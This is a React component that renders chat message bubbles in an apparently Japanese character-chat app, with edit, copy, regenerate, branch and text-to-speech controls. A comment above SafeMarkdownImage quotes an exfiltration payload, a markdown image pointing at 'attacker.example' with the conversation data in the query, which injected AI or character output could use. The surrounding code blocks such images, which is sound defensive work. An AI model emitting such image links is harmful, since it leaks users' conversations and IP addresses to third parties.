import { memo, type ComponentPropsWithoutRef } from 'react';
import { ArrowUp, Pencil, Copy, Check, FileText, GitBranch, Loader2, RefreshCw, Square, Volume2 } from 'lucide-react';
import ReactMarkdown, {
    defaultUrlTransform,
    type Components,
    type UrlTransform,
} from 'react-markdown';
import { formatMessageTextWithAttachments } from '@/lib/chatAttachments';
import { isAllowedMarkdownImageSource } from '@/lib/imageSourcePolicy';
import { formatAssistantMarkdown, hideAssistantDialogueBrackets, splitAssistantMarkdownActions } from '@/lib/markdownUtils';
import type { MessageAttachment } from '@/lib/store';
import { stopTtsPlayback, useTtsEntry } from '@/lib/ttsPlayer';
import StoredImage from './StoredImage';
import InlineMessageEditor from './chat/InlineMessageEditor';

/** キャラアイコンは固定したまま、最初のバブルだけを少し下へずらす量。 */
const ICON_TO_BUBBLE_SHIFT = '0.5rem';

/** 外部画像の読み込みを止めたときに出す文言。 */
const BLOCKED_IMAGE_LABEL = '外部画像は表示されません';

/**
 * Markdown中の画像。外部URLをそのまま描画すると、AIや取り込んだキャラクターの
 * 出力に仕込まれた `![](https://attacker.example/?data=...)` で会話内容や
 * IPアドレスが外部へ送られる。アプリ内で完結する参照だけを表示する。
 */
function SafeMarkdownImage({ src, alt, title }: ComponentPropsWithoutRef<'img'>) {
    if (typeof src !== 'string' || !isAllowedMarkdownImageSource(src)) {
        // URLはtitleに残すが、長すぎる値で表示が崩れないよう切り詰める。
        const blockedTitle = typeof src === 'string'
            ? `${BLOCKED_IMAGE_LABEL}: ${src.length > 200 ? `${src.slice(0, 200)}…` : src}`
            : BLOCKED_IMAGE_LABEL;
        return (
            <span
                role="img"
                aria-label={BLOCKED_IMAGE_LABEL}
                title={blockedTitle}
                style={{
                    display: 'inline-block',
                    padding: '0.1rem 0.4rem',
                    border: '1px dashed var(--border-color)',
                    borderRadius: '0.375rem',
                    color: 'var(--text-muted)',
                    fontSize: '0.85em',
                }}
            >
                {BLOCKED_IMAGE_LABEL}
            </span>
        );
    }
    // asset: 参照はStoredImageが /api/assets/<id> へ解決する。
    return <StoredImage src={src} alt={alt ?? ''} title={title} />;
}

const MARKDOWN_COMPONENTS: Components = { img: SafeMarkdownImage };

/**
 * react-markdownの既定のサニタイザは `data:` / `blob:` / `asset:` を空文字にする。
 * 許可済みの画像参照だけはそのまま通し、それ以外（リンク等）は既定の判定に任せる。
 */
const markdownUrlTransform: UrlTransform = (url, key, node) => {
    if (key === 'src' && node.tagName === 'img' && isAllowedMarkdownImageSource(url)) {
        return url;
    }
    return defaultUrlTransform(url);
};

/** 外部画像を描画しない設定をまとめた、メッセージ本文用のMarkdown。 */
function MessageMarkdown({ children }: { children: string }) {
    return (
        <ReactMarkdown components={MARKDOWN_COMPONENTS} urlTransform={markdownUrlTransform}>
            {children}
        </ReactMarkdown>
    );
}

interface MessageBubbleProps {
    messageId: string;
    role: 'user' | 'assistant';
    content: string;
    displayContent: string;
    attachments?: MessageAttachment[];
    index: number;
    isArchived: boolean;
    isLastMessage: boolean;
    isLoading: boolean;
    isHovered: boolean;
    isCopied: boolean;
    /** ユーザー発言をAIが読んだ（返信の生成が始まった）か。 */
    isRead?: boolean;
    disableEntranceAnimation?: boolean;
    isTypewriterActive?: boolean;
    formatAssistantActions?: boolean;
    isAssistantContinuation?: boolean;
    /** メッセージモードではキャラ側の各バブルが独立したメッセージとして扱われる。 */
    isMessageMode?: boolean;
    showAssistantActions?: boolean;
    showBranchAction?: boolean;
    /** キャラ側の発言を書き換えられるか。 */
    canEditAssistant?: boolean;
    showArchiveDivider: boolean;
    /** メッセージの上に出す日付の区切り。 */
    dateLabel?: string;
    /** メッセージの下に出す送信時刻。 */
    timeLabel?: string;
    /** `timeLabel` の元になった時刻。 */
    timestamp?: number;
    characterIcon?: string;
    characterName?: string;
    isGroupRoom?: boolean;
    /** シチュエーションの場面ナレーション。アイコンと名前を出さず、地の文として表示する。 */
    isNarration?: boolean;
    onMouseEnter: (id: string) => void;
    onMouseLeave: (e: React.MouseEvent) => void;
    onTouchStart: (id: string) => void;
    onEdit: (messageId: string, index: number, content: string) => void;
    isEditing?: boolean;
    editContent?: string;
    onEditChange: (content: string) => void;
    onCancelEdit: () => void;
    onSubmitEdit: () => void;
    onCopy: (id: string, content: string) => void;
    onRegenerate: () => void;
    onBranch: () => void;
    onRevealTypewriter?: () => void;
    onTtsToggle?: () => void;
    onPreviewImage?: (src: string, name: string) => void;
}

export default memo(function MessageBubble({
    messageId,
    role,
    content,
    displayContent,
    attachments,
    index,
    isArchived,
    isLastMessage,
    isLoading,
    isHovered,
    isCopied,
    isRead = false,
    disableEntranceAnimation = false,
    isTypewriterActive,
    formatAssistantActions = true,
    isAssistantContinuation = false,
    isMessageMode = false,
    showAssistantActions = true,
    showBranchAction = false,
    canEditAssistant = false,
    showArchiveDivider,
    dateLabel,
    timeLabel,
    timestamp,
    characterIcon,
    characterName,
    isGroupRoom,
    isNarration = false,
    onMouseEnter,
    onMouseLeave,
    onTouchStart,
    onEdit,
    isEditing = false,
    editContent = '',
    onEditChange,
    onCancelEdit,
    onSubmitEdit,
    onCopy,
    onRegenerate,
    onBranch,
    onRevealTypewriter,
    onTtsToggle,
    onPreviewImage,
}: MessageBubbleProps) {
    const { status: ttsStatus } = useTtsEntry(messageId);
    const isUserMessage = role === 'user';
    // メッセージモードでは、連続する同一キャラのバブルもそれぞれ独立した
    // メッセージとしてアイコンと名前を表示する (連結バブル扱いにしない)。
    const showsCharacterHeader = isMessageMode || !isAssistantContinuation;
    const isContinuationRow = isAssistantContinuation && !isMessageMode;
    const showRegenerateBtn = isLastMessage && role === 'assistant' && !isLoading;

    const assistantContent = hideAssistantDialogueBrackets(displayContent) || '...';
    const assistantSegments = splitAssistantMarkdownActions(assistantContent);
    const hasAttachments = (attachments?.length ?? 0) > 0;
    const userSegments = content.trim() || !hasAttachments
        ? splitAssistantMarkdownActions(content)
        : [];
    const userCopyText = content.trim()
        ? content
        : formatMessageTextWithAttachments(content, attachments);
    const formatAssistantSegment = (segmentContent: string) => (
        formatAssistantActions ? formatAssistantMarkdown(segmentContent) : segmentContent
    );

    const userMessageBody = (
        <>
            {hasAttachments && (
                <div className="user-message-attachments animate-slide-up">
                    {attachments!.map((attachment) => (
                        attachment.kind === 'image' ? (
                            attachment.data && onPreviewImage ? (
                                <button
                                    key={attachment.id}
                                    type="button"
                                    className="message-attachment-image-card message-attachment-image-button"
                                    onClick={() => onPreviewImage(attachment.data, attachment.name)}
                                    title={`${attachment.name} を拡大表示`}
                                    aria-label={`${attachment.name} を拡大表示`}
                                >
                                    <StoredImage
                                        src={attachment.data}
                                        alt={attachment.name}
                                        className="message-attachment-image"
                                    />
                                </button>
                            ) : (
                                <div key={attachment.id} className="message-attachment-image-card">
                                    <StoredImage
                                        src={attachment.data}
                                        alt={attachment.name}
                                        className="message-attachment-image"
                                    />
                                </div>
                            )
                        ) : (
                            <div
                                key={attachment.id}
                                className="message-attachment-file-card"
                                title={attachment.name}
                            >
                                <FileText size={16} className="message-attachment-file-icon" />
                                <span className="message-attachment-file-name">{attachment.name}</span>
                            </div>
                        )
                    ))}
                </div>
            )}
            {isEditing ? (
                <InlineMessageEditor
                    value={editContent}
                    onChange={onEditChange}
                    onCancel={onCancelEdit}
                    onSubmit={onSubmitEdit}
                    disabled={isLoading}
                    submitDisabled={!editContent.trim() && !hasAttachments}
                    submitLabel="送信"
                    submitIcon={<ArrowUp size={14} />}
                />
            ) : (
                userSegments.map((segment, segmentIndex) => (
                    segment.type === 'action' ? (
                        <div
                            key={`${messageId}-segment-${segmentIndex}`}
                            className="assistant-action-description animate-slide-up"
                        >
                            <MessageMarkdown>{segment.content}</MessageMarkdown>
                        </div>
                    ) : (
                        <div
                            key={`${messageId}-segment-${segmentIndex}`}
                            className={`message-bubble user animate-slide-up${segmentIndex > 0 ? ' user-segment-continuation' : ''}`}
                        >
                            <MessageMarkdown>{formatAssistantSegment(segment.content)}</MessageMarkdown>
                        </div>
                    )
                ))
            )}
        </>
    );

    const userMessageActions = (
        <div
            className="edit-btn-wrapper"
            style={{
                opacity: isHovered && !isEditing ? 1 : 0,
                pointerEvents: isHovered && !isEditing ? 'auto' : 'none',
                transition: 'opacity 0.15s ease',
                display: 'flex',
                justifyContent: 'flex-end',
                gap: '0.375rem',
                // メッセージモードではバブルの左隣、下端揃えで並べる。
                ...(isMessageMode
                    ? { flexShrink: 0, alignSelf: 'flex-end' }
                    : { marginTop: '0.25rem', marginRight: '0.25rem' }),
            }}
        >
            <button
                type="button"
                className="btn btn-ghost edit-btn message-action-button"
                onClick={() => onCopy(messageId, userCopyText)}
                style={{
                    color: isCopied ? 'var(--accent-primary)' : 'var(--text-muted)',
                    transition: 'color 0.15s ease',
                }}
                title={isCopied ? 'コピー済み' : 'コピー'}
                aria-label={isCopied ? 'コピー済み' : 'コピー'}
            >
                {isCopied ? <Check size={12} /> : <Copy size={12} />}
            </button>
            <button
                type="button"
                className="btn btn-ghost edit-btn message-action-button"
                onClick={() => onEdit(messageId, index, content)}
                style={{
                    color: 'var(--text-muted)',
                }}
                title={isArchived ? 'ここまで巻き戻して編集' : 'メッセージを編集'}
                aria-label={isArchived ? 'ここまで巻き戻して編集' : 'メッセージを編集'}
                disabled={isLoading}
            >
                <Pencil size={12} />
            </button>
        </div>
    );

    const timeElement = timeLabel ? (
        <time
            className="message-time"
            dateTime={timestamp ? new Date(timestamp).toISOString() : undefined}
        >
            {timeLabel}
        </time>
    ) : null;

    return (
        <div className={isContinuationRow ? 'message-continuation' : undefined} style={isArchived ? { opacity: 0.45 } : undefined}>
            {dateLabel && (
                <div className="message-date-divider" role="separator" aria-label={dateLabel}>
                    <span>{dateLabel}</span>
                </div>
            )}
            {showArchiveDivider && (
                <div style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: '0.5rem',
                    margin: '0.75rem 0',
                    fontSize: '0.7rem',
                    color: 'var(--text-muted)',
                }}>
                    <div style={{ flex: 1, height: '1px', background: 'var(--border-color)' }} />
                    圧縮済み
                    <div style={{ flex: 1, height: '1px', background: 'var(--border-color)' }} />
                </div>
            )}
            {isUserMessage ? (
                <div
                    className="message-hover-zone user-message-wrapper"
                    onMouseEnter={() => onMouseEnter(messageId)}
                    onMouseLeave={onMouseLeave}
                    onTouchStart={(e) => {
                        e.stopPropagation();
                        if ((e.target as Element).closest('button, a, input, textarea, select, [role="button"]')) return;
                        onTouchStart(messageId);
                    }}
                >
                    {isMessageMode && !isEditing ? (
                        <div className="user-message-row">
                            {userMessageActions}
                            <div className="user-message-body">
                                {userMessageBody}
                            </div>
                        </div>
                    ) : userMessageBody}
                    {(isRead || timeElement) && !isEditing && (
                        <div className="message-meta">
                            {isRead && (
                                <span className="message-read-receipt" aria-label="既読">
                                    既読
                                </span>
                            )}
                            {timeElement}
                        </div>
                    )}
                    {!isMessageMode && userMessageActions}
                </div>
            ) : (
                <div
                    className="message-hover-zone"
                    onMouseEnter={() => onMouseEnter(messageId)}
                    onMouseLeave={onMouseLeave}
                    onTouchStart={(e) => {
                        e.stopPropagation();
                        if ((e.target as Element).closest('button, a, input, textarea, select, [role="button"]')) return;
                        onTouchStart(messageId);
                    }}
                    style={{ display: 'flex', alignItems: 'flex-start', gap: '0.5rem' }}
                >
                    {isNarration ? null : (
                    <div
                        aria-hidden={!showsCharacterHeader}
                        style={{
                            flexShrink: 0,
                            width: '2rem',
                            height: '2rem',
                            borderRadius: '50%',
                            overflow: 'hidden',
                            marginTop: '0.25rem',
                            background: 'var(--bg-secondary)',
                            border: '1px solid var(--border-color)',
                            visibility: showsCharacterHeader ? undefined : 'hidden',
                        }}
                    >
                        {showsCharacterHeader && (
                            characterIcon ? (
                                <StoredImage src={characterIcon} alt={characterName ?? 'character'} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                            ) : (
                                <div style={{ width: '100%', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '0.85rem', color: 'var(--text-muted)', fontWeight: 600 }}>
                                    {characterName ? characterName.charAt(0) : '?'}
                                </div>
                            )
                        )}
                    </div>
                    )}
                    <div className={[
                        'assistant-message-content',
                        isNarration ? 'situation-narration-content' : '',
                        isEditing ? 'editing' : '',
                    ].filter(Boolean).join(' ')}>
                    {!isNarration && isGroupRoom && characterName && showsCharacterHeader && (
                        <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', marginBottom: '0.125rem', marginLeft: '0.25rem', fontWeight: 500 }}>
                            {characterName}
                        </div>
                    )}
                    {isEditing ? (
                        <InlineMessageEditor
                            className="assistant"
                            value={editContent}
                            onChange={onEditChange}
                            onCancel={onCancelEdit}
                            onSubmit={onSubmitEdit}
                            disabled={isLoading}
                            submitDisabled={!editContent.trim()}
                            submitLabel="保存"
                            submitIcon={<Check size={14} />}
                        />
                    ) : (<>
                    {isNarration ? (
                        <div
                            className={`situation-narration${disableEntranceAnimation ? '' : ' animate-slide-up'}`}
                            onClick={isTypewriterActive ? onRevealTypewriter : undefined}
                            title={isTypewriterActive ? '全文表示' : undefined}
                            style={{ cursor: isTypewriterActive ? 'pointer' : undefined }}
                        >
                            <MessageMarkdown>{assistantContent}</MessageMarkdown>
                        </div>
                    ) : null}
                    {!isNarration && assistantSegments.map((segment, segmentIndex) => (
                        segment.type === 'action' ? (
                            <div
                                key={`${messageId}-segment-${segmentIndex}`}
                                className={`assistant-action-description${disableEntranceAnimation ? '' : ' animate-slide-up'}`}
                                onClick={isTypewriterActive ? onRevealTypewriter : undefined}
                                title={isTypewriterActive ? '全文表示' : undefined}
                                style={{
                                    cursor: isTypewriterActive ? 'pointer' : undefined,
                                    marginTop: showsCharacterHeader && segmentIndex === 0 ? ICON_TO_BUBBLE_SHIFT : undefined,
                                }}
                            >
                                <MessageMarkdown>{segment.content}</MessageMarkdown>
                            </div>
                        ) : (
                            <div
                                key={`${messageId}-segment-${segmentIndex}`}
                                className={`message-bubble assistant assistant-segment-bubble${disableEntranceAnimation ? '' : ' animate-slide-up'} ${segmentIndex > 0 ? 'assistant-segment-continuation' : ''}`}
                                onClick={isTypewriterActive ? onRevealTypewriter : undefined}
                                title={isTypewriterActive ? '全文表示' : undefined}
                                style={{
                                    cursor: isTypewriterActive ? 'pointer' : undefined,
                                    marginTop: showsCharacterHeader && segmentIndex === 0 ? ICON_TO_BUBBLE_SHIFT : undefined,
                                }}
                            >
                                <MessageMarkdown>{formatAssistantSegment(segment.content)}</MessageMarkdown>
                            </div>
                        )
                    ))}
                    {!isNarration && timeElement && (
                        <div className="message-meta assistant">{timeElement}</div>
                    )}
                    {canEditAssistant && !showAssistantActions && (
                        <button
                            type="button"
                            className="btn btn-ghost edit-btn message-action-button assistant-floating-edit-button"
                            onClick={() => onEdit(messageId, index, content)}
                            style={{
                                color: 'var(--text-muted)',
                                opacity: isHovered ? 1 : 0,
                                pointerEvents: isHovered ? 'auto' : 'none',
                            }}
                            title="メッセージを編集"
                            aria-label="メッセージを編集"
                        >
                            <Pencil size={12} />
                        </button>
                    )}
                    </>)}
                    {showAssistantActions && !isEditing && (
                        <div className="assistant-btn-row" style={{
                            display: 'flex',
                            justifyContent: 'flex-start',
                            gap: '0.375rem',
                            marginTop: '0.25rem',
                            marginLeft: '0.25rem',
                            opacity: isHovered ? 1 : 0,
                            pointerEvents: isHovered ? 'auto' : 'none',
                            transition: 'opacity 0.15s ease',
                        }}>
                            <button
                                type="button"
                                className="btn btn-ghost message-action-button"
                                onClick={() => onCopy(messageId, displayContent)}
                                style={{
                                    color: isCopied ? 'var(--accent-primary)' : 'var(--text-muted)',
                                    transition: 'color 0.15s ease',
                                }}
                                title={isCopied ? 'コピー済み' : 'コピー'}
                                aria-label={isCopied ? 'コピー済み' : 'コピー'}
                            >
                                {isCopied ? <Check size={12} /> : <Copy size={12} />}
                            </button>
                            {canEditAssistant && (
                                <button
                                    type="button"
                                    className="btn btn-ghost edit-btn message-action-button"
                                    onClick={() => onEdit(messageId, index, content)}
                                    style={{ color: 'var(--text-muted)' }}
                                    title="メッセージを編集"
                                    aria-label="メッセージを編集"
                                >
                                    <Pencil size={12} />
                                </button>
                            )}
                            <button
                                type="button"
                                className="btn btn-ghost message-action-button"
                                onClick={onRegenerate}
                                style={{
                                    color: 'var(--text-muted)',
                                    display: showRegenerateBtn ? undefined : 'none',
                                }}
                                title="回答を再生成"
                                aria-label="回答を再生成"
                            >
                                <RefreshCw size={14} />
                            </button>
                            <button
                                type="button"
                                className="btn btn-ghost message-action-button"
                                onClick={onBranch}
                                style={{
                                    color: 'var(--text-muted)',
                                    display: showBranchAction && !isLoading ? undefined : 'none',
                                }}
                                title="ここから会話を分岐"
                                aria-label="ここから会話を分岐"
                            >
                                <GitBranch size={14} />
                            </button>
                            {onTtsToggle && (
                                <button
                                    type="button"
                                    className="btn btn-ghost message-action-button"
                                    onClick={() => {
                                        if (ttsStatus === 'playing' || ttsStatus === 'loading') {
                                            stopTtsPlayback();
                                        } else {
                                            onTtsToggle();
                                        }
                                    }}
                                    style={{
                                        color: ttsStatus === 'error' ? 'var(--error)' : 'var(--text-muted)',
                                        transition: 'color 0.15s ease',
                                    }}
                                    title={
                                        ttsStatus === 'playing'
                                            ? '停止'
                                            : ttsStatus === 'loading'
                                                ? '生成中…'
                                                : '読み上げ'
                                    }
                                    aria-label={
                                        ttsStatus === 'playing'
                                            ? '停止'
                                            : ttsStatus === 'loading'
                                                ? '生成中…'
                                                : '読み上げ'
                                    }
                                >
                                    {ttsStatus === 'loading' ? (
                                        <Loader2 size={14} className="animate-spin" />
                                    ) : ttsStatus === 'playing' ? (
                                        <Square size={14} />
                                    ) : (
                                        <Volume2 size={14} />
                                    )}
                                </button>
                            )}
                        </div>
                    )}
                    </div>
                </div>
            )}
        </div>
    );
});
